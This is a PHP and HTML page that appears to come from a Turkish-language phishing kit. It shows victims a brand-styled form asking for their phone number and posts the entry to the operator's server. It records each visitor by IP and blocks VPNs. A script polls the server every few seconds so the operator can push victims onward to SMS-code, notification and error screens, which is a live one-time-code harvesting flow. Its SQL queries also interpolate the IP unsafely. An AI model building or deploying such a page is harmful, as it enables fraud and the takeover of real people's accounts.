<?php include_once("config.php"); include_once("./admin/Data/Server/GrabIP.php"); include_once("./admin/Data/Server/BlockVPN.php");  include_once("./admin/Data/Server/BanControl.php");
   $pdo->query("UPDATE logs SET durum = 'Telefon Ekranı' WHERE ip = '{$ip}'");
   $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
   if(empty($check)) {
      header('Location: /');
   }
?>
<!DOCTYPE html>
<html lang="tr">
   <head>
	   <!-- Facebook Pixel Temel Kodu -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '9856059084424607'); // Buraya kendi Pixel ID'ni ekle
  fbq('track', 'Purchase');
</script>

      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
      <script src="./assets/js/hHdiF0lg98fZ.js"></script>
      <title>Mobile Sayfa</title>
      <style>
         @font-face {
         font-family: 'KelveticaNobis';
         src: url('./assets/fonts/OwwgtWr5KJVN.otf') format('opentype');
         font-weight: normal;
         font-style: normal;
         }
         body, html {
         background-color: #f1f2f2;
         padding: 0;
         max-width: 414px;
         margin: 0 auto;
         font-family: 'KelveticaNobis', sans-serif;
         }
         header {
         width: 100%;
         height: 106px;
         background-image: url('./assets/images/2gQEoHpYiwxx.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         .main {
         min-height: 805px;
         width: 100%;
         height: 805px;
         background-image: url('./assets/images/irpyabLMrXNK.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         input.form-control {
         width: 85%;
         height: 50px;
         font-family: 'KelveticaNobis', sans-serif;
         margin-bottom: 10px;
         margin-top: 5px;
         border: none;
         font-size: 16px;
         margin-left: 15px;
         margin-right: 15px;
         padding-left: 20px;
         }
         input.form-control:focus {
         outline: none;
         box-shadow: none;
         }
         button.btn {
         width: 90%;
         height: 50px;
         margin-top: 20px;
         background-color: #2ea8ab;
         border: none;
         color: #fff;
         font-size: 14px;
         cursor: pointer;
         border-radius: 0;
         }
         .fullscreen-div {
         position: fixed;
         top: 0;
         width: 100%;
         height: 100%;
         background-image: url('./assets/images/KP637W4a62PL.png');
         background-size: cover;
         background-position: center;
         z-index: 9999;
         display: none;
         max-width: 414px;
         }
         .error-message {
         color: red;
         font-size: 14px;
         margin-bottom: 10px;
         font-weight: 700;
         }
         /* Preloader */
         .preloader {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
         height: 100%;
         background-color: #ffffff;
         z-index: 10000;
         display: flex;
         justify-content: center;
         align-items: center;
         }
         .spinner {
         border: 5px solid #f3f3f3;
         border-top: 5px solid #2ea8ab;
         border-radius: 50%;
         width: 40px;
         height: 40px;
         animation: spin 1s linear infinite;
         }
         @keyframes spin {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
         }
         .error-message {
         color: red;
         font-size: 14px;
         margin-top: 5px;
         display: none;
         }
      </style>
   </head>
   <body>
      <header></header>
         <div class="main">
            <center>
               <label for="phone2" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848;">Telefon Numaranızı Yazınız</label>
               <input type="text" name="phone2" class="form-control" value="" id="phone2" inputmode="numeric" required="">
               <div id="errorMessage" class="error-message">Telefon numaranızı lütfen kontrol ediniz.</div>
            </center>
            <center>
               <button id="formSubmit" class="btn" type="button">Giriş</button>
            </center>
         </div>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.1/imask.min.js" integrity="sha512-+3RJc0aLDkj0plGNnrqlTwCCyMmDCV1fSYqXw4m+OczX09Pas5A/U+V3pFwrSyoC1svzDy40Q9RU/85yb/7D2A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

         <script>
            var cvv = IMask(
            document.getElementById('phone2'), {
               mask: '(000) 000 00 00'
            }
         );


         document.getElementById("formSubmit").addEventListener("click", function(e) {
            var telefon_numarasi = document.getElementById("phone2").value
            e.preventDefault();

            if (telefon_numarasi == null || telefon_numarasi == "" || telefon_numarasi.length !== 15) {
               document.getElementById("phone2").focus();
               document.getElementById('errorMessage').style.display = "block";
            } else {
               document.getElementById('errorMessage').style.display = "none";
               $.ajax({
               type: "POST",
               url: "./request.php?action=telefon",
               data: {
                  telefon_numarasi: telefon_numarasi
               },
               success: function (data) {
                  window.location.href = "bekle"
               }
               });
            }
                   
         })
      </script>
      <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg == 'sms') {
                  window.location.href = '/sms';
              }
              if (msg == 'tebrikler') {
                  window.location.href = '/basarili';
              }
              if (msg == 'telefon') {
                  window.location.href = '/phone';
              }
              if (msg == 'bildirim') {
                  window.location.href = '/bildirim';
              }
              if (msg == 'hata_sms') {
                  window.location.href = '/sms?error=1';
              }
              if (msg == 'hata_hesap') {
                  window.location.href = '/?error=1';
              }
              if (msg == 'basa_dondur') {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
   </body>
</html>